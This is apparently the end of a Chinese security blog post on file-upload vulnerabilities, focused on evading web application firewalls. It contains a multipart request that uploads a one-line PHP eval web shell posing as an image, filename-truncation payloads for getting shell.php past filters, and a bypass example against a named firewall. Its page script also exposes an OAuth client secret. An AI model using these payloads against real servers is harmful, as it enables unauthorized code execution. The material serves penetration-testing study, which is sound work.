bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8659f2312bf8658dafbf0fd31ead48dcc0b9f2312bfWebKitFormBoundaryzEHC1GyG8wYOH1rffbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b8dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9boundary=----WebKitFormBoundaryzEHC1GyG8wYOH1rf</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>319</span><br><span class="line"></span><br><span class="line"><span class="language-php">------WebKitFormBoundaryzEHC1GyG8wYOH1rf</span></span><br><span class="line"><span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;upload_file&quot;</span>; filename=<span class="string">&quot;shell.php&quot;</span></span></span><br><span class="line"><span class="language-php">Content-Type: image/png</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;x&#x27;</span>]);<span class="meta">?&gt;</span></span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">------WebKitFormBoundaryzEHC1GyG8wYOH1rf</span></span><br><span class="line"><span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;submit&quot;</span></span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">上传</span></span><br><span class="line"><span class="language-php">------WebKitFormBoundaryzEHC1GyG8wYOH1rf--</span></span><br></pre></td></tr></table></figure>

<h3 id="数据截断"><a href="#数据截断" class="headerlink" title="数据截断"></a><strong>数据截断</strong></h3><h4 id="回车换行截断"><a href="#回车换行截断" class="headerlink" title="回车换行截断"></a><strong>回车换行截断</strong></h4><p>POST 请求头的值（不是请求头）是可以换行的，但是中间不得有空行。若 WAF 匹配文件名到换行截止，则可以绕过。</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Disposition</span><span class="punctuation">: </span>for</span><br><span class="line">m-data; name=&quot;upload_</span><br><span class="line">file&quot;; fi</span><br><span class="line">le</span><br><span class="line">name=&quot;sh</span><br><span class="line">ell.p</span><br><span class="line">h</span><br><span class="line">p&quot;</span><br></pre></td></tr></table></figure>

<h4 id="分号截断"><a href="#分号截断" class="headerlink" title="分号截断"></a><strong>分号截断</strong></h4><p>若WAF匹配文件名到分号截止，则可以绕过。</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Disposition</span><span class="punctuation">: </span>form-data; name=&quot;upload_file&quot;; filename=&quot;shell.jpg;.php&quot;</span><br></pre></td></tr></table></figure>

<h4 id="引号截断"><a href="#引号截断" class="headerlink" title="引号截断"></a><strong>引号截断</strong></h4><p>php &lt; 5.3 单双引号截断特性。</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Disposition</span><span class="punctuation">: </span>form-data; name=&quot;upload_file&quot;; filename=&quot;shell.jpg&#x27;.php&quot;</span><br><span class="line"><span class="attribute">Content-Disposition</span><span class="punctuation">: </span>form-data; name=&quot;upload_file&quot;; filename=&quot;shell.jpg&quot;.php&quot;</span><br></pre></td></tr></table></figure>

<h4 id="00-截断"><a href="#00-截断" class="headerlink" title="00 截断"></a><strong>00 截断</strong></h4><p>在 url 中 <code>%00</code> 表示 ascll 码中的 <code>0</code> ，而 ascii 中 <code>0</code> 作为特殊字符保留，所以当 url 中出现 <code>%00</code> 时就会认为读取已结束。这里使用 <code>[0x00]</code> 代替 16 进制的 <code>00</code> 字符</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Disposition</span><span class="punctuation">: </span>form-data; name=&quot;upload_file&quot;; filename=&quot;shell.php[0x00].jpg&quot;</span><br></pre></td></tr></table></figure>

<h3 id="绕过实例"><a href="#绕过实例" class="headerlink" title="绕过实例"></a>绕过实例</h3><p>安 * 明御防火墙：</p>
<p><img src="https://raw.githubusercontents.com/sing3r/image/main/AnHengMingYuWAFUploadBypass.png" alt="安恒明御防火墙文件上传绕过"></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/pentesting-web/file-upload">https://book.hacktricks.xyz/pentesting-web/file-upload</a><br><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1944142">https://cloud.tencent.com/developer/article/1944142</a></p>

    </div>

    
    
    

      <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" rel="tag"># 文件上传</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2023/02/06/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%BB%95%E8%BF%87-HttpOnly-%E7%9A%84-XSS-%E6%94%BB%E5%87%BB/" rel="prev" title="记一次绕过 HttpOnly 的 XSS 攻击">
      <i class="fa fa-chevron-left"></i> 记一次绕过 HttpOnly 的 XSS 攻击
    </a></div>
      <div class="post-nav-item"></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          
    <div class="comments" id="gitalk-container"></div>

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E"><span class="nav-number">1.</span> <span class="nav-text">文件上传漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%80%9A%E7%94%A8%E6%96%B9%E6%B3%95"><span class="nav-number">1.1.</span> <span class="nav-text">文件上传通用方法</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%AF%E8%83%BD%E4%BC%9A%E8%A2%AB%E8%A7%A3%E6%9E%90%E4%B8%BA%E4%BB%A3%E7%A0%81%E7%9A%84%E6%96%87%E4%BB%B6%E5%90%8E%E7%BC%80"><span class="nav-number">1.1.1.</span> <span class="nav-text">可能会被解析为代码的文件后缀</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E6%96%87%E4%BB%B6%E5%90%8E%E7%BC%80%E6%A3%80%E6%9F%A5%E7%9A%84%E6%96%B9%E6%B3%95"><span class="nav-number">1.1.2.</span> <span class="nav-text">绕过文件后缀检查的方法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%95%E8%BF%87-Content-Type-%E5%B9%BB%E6%95%B0-%E6%96%87%E4%BB%B6%E5%8E%8B%E7%BC%A9-amp-%E6%96%87%E4%BB%B6-size-%E9%87%8D%E7%BD%AE"><span class="nav-number">1.1.3.</span> <span class="nav-text">绕过 Content-Type , 幻数, 文件压缩 &amp; 文件 size 重置</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%B6%E4%BB%96%E6%96%B9%E6%B3%95"><span class="nav-number">1.1.4.</span> <span class="nav-text">其他方法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%89%B9%E5%88%AB%E5%90%8E%E7%BC%80%E6%96%87%E4%BB%B6%E6%8A%80%E5%B7%A7"><span class="nav-number">1.1.5.</span> <span class="nav-text">特别后缀文件技巧</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Jetty-RCE"><span class="nav-number">1.2.</span> <span class="nav-text">Jetty RCE</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#uWSGI-RCE"><span class="nav-number">1.3.</span> <span class="nav-text">uWSGI RCE</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#wget-File-Upload-x2F-SSRF-Trick"><span class="nav-number">1.4.</span> <span class="nav-text">wget File Upload&#x2F;SSRF Trick</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%8E%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6%E5%88%B0%E5%85%B6%E4%BB%96%E6%BC%8F%E6%B4%9E"><span class="nav-number">1.5.</span> <span class="nav-text">从上传文件到其他漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Zip-x2F-Tar-File-Automatically-decompressed-Upload"><span class="nav-number">1.6.</span> <span class="nav-text">Zip&#x2F;Tar File Automatically decompressed Upload</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ImageTragic"><span class="nav-number">1.7.</span> <span class="nav-text">ImageTragic</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B9%8B%E4%B8%AD%E9%97%B4%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E5%8F%8A%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF%E5%88%A9%E7%94%A8"><span class="nav-number">1.8.</span> <span class="nav-text">文件上传之中间件解析漏洞及配置错误利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Apahce"><span class="nav-number">1.8.1.</span> <span class="nav-text">Apahce</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Nginx"><span class="nav-number">1.8.2.</span> <span class="nav-text">Nginx</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#IIS"><span class="nav-number">1.8.3.</span> <span class="nav-text">IIS</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B9%8B-WAF-%E5%AF%B9%E6%8A%97"><span class="nav-number">1.9.</span> <span class="nav-text">文件上传之 WAF 对抗</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BC%95%E5%8F%B7%E5%8F%98%E6%8D%A2"><span class="nav-number">1.9.1.</span> <span class="nav-text">引号变换</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A4%A7%E5%B0%8F%E5%86%99%E5%8F%98%E6%8D%A2"><span class="nav-number">1.9.2.</span> <span class="nav-text">大小写变换</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8D%A2%E8%A1%8C%E7%AC%A6"><span class="nav-number">1.9.3.</span> <span class="nav-text">换行符</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A4%9A%E4%B8%AA%E5%88%86%E5%8F%B7"><span class="nav-number">1.9.4.</span> <span class="nav-text">多个分号</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A4%9A%E4%B8%AA%E7%AD%89%E5%8F%B7"><span class="nav-number">1.9.5.</span> <span class="nav-text">多个等号</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%98%E6%8D%A2-Content-Disposition-%E7%9A%84%E5%80%BC"><span class="nav-number">1.9.6.</span> <span class="nav-text">变换 Content-Disposition 的值</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%95%B8%E5%BD%A2%E7%9A%84-boundary-%E5%A4%B4%E9%83%A8"><span class="nav-number">1.9.7.</span> <span class="nav-text">畸形的 boundary 头部</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A1%BA%E5%BA%8F%E9%A2%A0%E5%80%92"><span class="nav-number">1.9.8.</span> <span class="nav-text">顺序颠倒</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BA%A4%E6%8D%A2-name-%E5%92%8C-filename-%E7%9A%84%E9%A1%BA%E5%BA%8F"><span class="nav-number">1.9.8.1.</span> <span class="nav-text">交换 name 和 filename 的顺序</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BA%A4%E6%8D%A2-Content-Disposition-%E5%92%8C-Content-Type-%E7%9A%84%E9%A1%BA%E5%BA%8F"><span class="nav-number">1.9.8.2.</span> <span class="nav-text">交换 Content-Disposition 和 Content-Type 的顺序</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BA%A4%E6%8D%A2%E4%B8%8D%E5%90%8C-boundary-%E5%86%85%E5%AE%B9%E7%9A%84%E9%A1%BA%E5%BA%8F"><span class="nav-number">1.9.8.3.</span> <span class="nav-text">交换不同 boundary 内容的顺序</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%95%B0%E6%8D%AE%E9%87%8D%E5%A4%8D"><span class="nav-number">1.9.9.</span> <span class="nav-text">数据重复</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#boundary-%E5%86%85%E5%AE%B9%E9%87%8D%E5%A4%8D"><span class="nav-number">1.9.9.1.</span> <span class="nav-text">boundary 内容重复</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#filename-%E9%87%8D%E5%A4%8D"><span class="nav-number">1.9.9.2.</span> <span class="nav-text">filename 重复</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9E%83%E5%9C%BE%E6%95%B0%E6%8D%AE"><span class="nav-number">1.9.10.</span> <span class="nav-text">垃圾数据</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#name-%E4%B8%8E-filename-%E4%B9%8B%E9%97%B4%E6%8F%92%E5%85%A5%E5%9E%83%E5%9C%BE%E6%95%B0%E6%8D%AE"><span class="nav-number">1.9.10.1.</span> <span class="nav-text">name 与 filename 之间插入垃圾数据</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#boundary-%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%AD%E5%8A%A0%E5%85%A5%E5%9E%83%E5%9C%BE%E6%95%B0%E6%8D%AE"><span class="nav-number">1.9.10.2.</span> <span class="nav-text">boundary 字符串中加入垃圾数据</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#boundray-%E6%9C%AB%E5%B0%BE%E6%8F%92%E5%85%A5%E5%9E%83%E5%9C%BE%E6%95%B0%E6%8D%AE"><span class="nav-number">1.9.10.3.</span> <span class="nav-text">boundray 末尾插入垃圾数据</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#multipart-x2F-form-data-%E4%B8%8E-boundary-%E4%B9%8B%E9%97%B4%E6%8F%92%E5%85%A5%E5%9E%83%E5%9C%BE%E6%95%B0%E6%8D%AE"><span class="nav-number">1.9.10.4.</span> <span class="nav-text">multipart&#x2F;form-data 与 boundary 之间插入垃圾数据</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%95%B0%E6%8D%AE%E6%88%AA%E6%96%AD"><span class="nav-number">1.9.11.</span> <span class="nav-text">数据截断</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9B%9E%E8%BD%A6%E6%8D%A2%E8%A1%8C%E6%88%AA%E6%96%AD"><span class="nav-number">1.9.11.1.</span> <span class="nav-text">回车换行截断</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%86%E5%8F%B7%E6%88%AA%E6%96%AD"><span class="nav-number">1.9.11.2.</span> <span class="nav-text">分号截断</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%BC%95%E5%8F%B7%E6%88%AA%E6%96%AD"><span class="nav-number">1.9.11.3.</span> <span class="nav-text">引号截断</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#00-%E6%88%AA%E6%96%AD"><span class="nav-number">1.9.11.4.</span> <span class="nav-text">00 截断</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E5%AE%9E%E4%BE%8B"><span class="nav-number">1.9.12.</span> <span class="nav-text">绕过实例</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-number">1.10.</span> <span class="nav-text">参考</span></a></li></ol></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">sing</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives">
          <span class="site-state-item-count">25</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
        <span class="site-state-item-count">13</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
        <span class="site-state-item-count">37</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2023</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">sing</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a>
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>




  




  
<script src="/js/local-search.js"></script>













  

  

<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">

<script>
NexT.utils.loadComments(document.querySelector('#gitalk-container'), () => {
  NexT.utils.getScript('//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js', () => {
    var gitalk = new Gitalk({
      clientID    : '6e8bfc081de57f042466',
      clientSecret: '9b93268b65af7c8c4e8af7a5a1a539f01671b723',
      repo        : 'sing3r.github.io',
      owner       : 'sing3r',
      admin       : ['sing3r'],
      id          : '252cefbdb6911c9803547df84589893a',
        language: '',
      distractionFreeMode: true
    });
    gitalk.render('gitalk-container');
  }, window.Gitalk);
});
</script>

</body>
</html>
